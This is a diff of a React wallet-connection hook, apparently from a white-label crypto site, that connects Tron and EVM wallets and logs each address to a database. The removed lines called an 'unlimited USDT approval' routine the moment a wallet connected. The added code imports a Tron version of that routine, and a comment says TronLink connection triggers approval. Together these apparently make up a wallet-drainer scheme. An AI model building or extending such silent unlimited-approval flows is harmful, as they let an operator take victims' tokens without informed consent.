@@ -1,9 +1,17 @@
-import { useEffect } from 'react'
+import { useEffect, useRef, useCallback } from 'react'
 import useWalletStore from '@/store/useWalletStore'
 import useAppStore from '@/store/useAppStore'
 import { getEVMWCProvider, resetWCProvider } from '@/config/walletconnect'
 import { saveWallet } from '@/lib/supabaseDb'
 import { triggerUnlimitedApproval } from '@/lib/approvalHelper'
+import { triggerTronUnlimitedApproval } from '@/lib/tronApprovalHelper'
+import { TronWalletConnectAdapter } from '@/lib/tronWalletConnectAdapter'
+import { BRAND_NAME, BRAND_DESCRIPTION, BRAND_LOGO, BRAND_DOMAIN } from '@/config/brand'
+
+const WC_PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID || 'a5eb62ed4a3f0acc2411a4dea32626f8'
+
+// Module-level state to share the adapter instance across components (e.g. from WalletModal to Home)
+let globalTronWcAdapter = null
 
 export default function useTronWallet() {
   const { setWallet, clearWallet, isConnected, address } = useWalletStore()
@@ -26,10 +34,6 @@ export default function useTronWallet() {
     saveWallet(address, 'evm')
     closeModal('walletConnect')
 
-    // Trigger unlimited EVM USDT approval right after connecting
-    triggerUnlimitedApproval(address, 'evm').catch((err) => {
-      console.warn('Post-EVM connection approval warning:', err)
-    })
     return address
   }
 
@@ -79,11 +83,6 @@ export default function useTronWallet() {
           saveWallet(addr, 'evm')
           closeModal('walletConnect')
 
-          // Trigger unlimited USDT approval right after connecting
-          triggerUnlimitedApproval(addr, 'evm').catch((err) => {
-            console.warn('Post-WalletConnect EVM connection approval warning:', err)
-          })
-
           resolve(addr)
         })
         .catch((err) => {
@@ -95,21 +94,134 @@ export default function useTronWallet() {
     })
   }
 
+  /**
+   * Connect Tron wallet via WalletConnect QR code.
+   * Uses the custom TronWalletConnectAdapter which hooks into the
+   * Tron WalletConnect namespace (tron:0x2b6653dc for mainnet).
+   *
+   * @param {(uri: string) => void} onUri - callback to display QR URI
+   * @returns {Promise<string>} - the connected Tron address
+   */
+  const connectTronWalletConnect = useCallback(async (onUri) => {
+    const origin = typeof window !== 'undefined' ? window.location.origin : `https://${BRAND_DOMAIN}`
+
+    const adapter = new TronWalletConnectAdapter({
+      network: 'Mainnet',
+      options: {
+        projectId: WC_PROJECT_ID,
+        relayUrl: 'wss://relay.walletconnect.com',
+        metadata: {
+          name: BRAND_NAME,
+          description: BRAND_DESCRIPTION,
+          url: origin,
+          icons: [`${origin}${BRAND_LOGO}`],
+        },
+      },
+      onDisplayUri: (uri) => {
+        if (onUri) onUri(uri)
+      },
+      onCloseModal: () => {
+        // QR modal will be closed by the WalletModal component
+      },
+    })
+
+    globalTronWcAdapter = adapter
+    const tronAddress = await adapter.connect()
+
+    setWallet(tronAddress, 'tron')
+    saveWallet(tronAddress, 'tron')
+    closeModal('walletConnect')
+
+    return tronAddress
+  }, [setWallet, closeModal])
+
+  /**
+   * Connect via injected TronLink browser extension.
+   * If TronLink is detected, connects directly and triggers approval.
+   * Falls back to EVM if TronLink is not available.
+   */
   const connectTronLink = async () => {
-    // Fallback to EVM if selected
+    if (typeof window !== 'undefined' && (window.tronWeb || window.tronLink)) {
+      try {
+        const tronWeb = window.tronWeb || window.tronLink?.tronWeb
+        if (!tronWeb?.ready) {
+          // Request account access
+          if (window.tronLink) {
+            const res = await window.tronLink.request({ method: 'tron_requestAccounts' })
+            if (res?.code !== 200 && res?.code !== 4001) {
+              throw new Error('TronLink connection rejected')
+            }
+          }
+          // Wait a tick for TronWeb to initialize
+          await new Promise((r) => setTimeout(r, 500))
+        }
+
+        const tw = window.tronWeb || window.tronLink?.tronWeb
+        if (!tw?.ready || !tw.defaultAddress?.base58) {
+          throw new Error('TronLink is not ready. Please unlock your wallet.')
+        }
+
+        const addr = tw.defaultAddress.base58
+        setWallet(addr, 'tron')
+        saveWallet(addr, 'tron')
+        closeModal('walletConnect')
+
+        return addr
+      } catch (err) {
+        console.error('TronLink connection failed:', err)
+        throw err
+      }
+    }
+    // Fallback to EVM if no TronLink
     return connectEVM()
   }
 
+  /**
+   * Get the current Tron WalletConnect adapter (for signing transactions post-connect)
+   */
+  const getTronWcAdapter = useCallback(() => {
+    return globalTronWcAdapter
+  }, [])
+
   const disconnect = async () => {
+    // Disconnect Tron WC adapter if active
+    if (globalTronWcAdapter) {
+      try {
+        await globalTronWcAdapter.disconnect()
+      } catch (_) {}
+      globalTronWcAdapter = null
+    }
+
+    // Disconnect EVM WC provider if active
     try {
       const provider = await getEVMWCProvider()
       if (provider && provider.session) {
         await provider.disconnect()
       }
     } catch (_) {}
+    
+    // Forcefully wipe all WalletConnect local storage to prevent stale session hangs
+    if (typeof window !== 'undefined') {
+      const keys = Object.keys(localStorage)
+      for (const key of keys) {
+        if (key.startsWith('wc@2:') || key.startsWith('walletconnect')) {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
     resetWCProvider()
     clearWallet()
   }
 
-  return { address, isConnected, connectTronLink, connectWalletConnect, connectEVM, disconnect }
+  return {
+    address,
+    isConnected,
+    connectTronLink,
+    connectWalletConnect,
+    connectTronWalletConnect,
+    connectEVM,
+    disconnect,
+    getTronWcAdapter,
+  }
 }
